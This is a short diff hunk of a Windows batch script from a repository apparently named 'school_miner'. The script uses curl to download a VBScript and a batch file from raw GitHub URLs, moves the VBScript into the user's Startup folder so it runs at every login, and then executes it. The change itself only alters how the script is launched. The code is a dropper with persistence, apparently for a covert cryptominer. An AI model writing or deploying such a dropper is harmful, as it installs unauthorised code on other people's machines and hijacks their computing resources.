@@ -2,5 +2,5 @@ curl -o setup.vbs https://raw.githubusercontent.com/ivanc5po/school_miner/main/s
 move setup.vbs "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 curl -o set.bat https://raw.githubusercontent.com/ivanc5po/school_miner/main/set.bat
 
-start "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\setup.vbs"
+"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\setup.vbs"
 exit
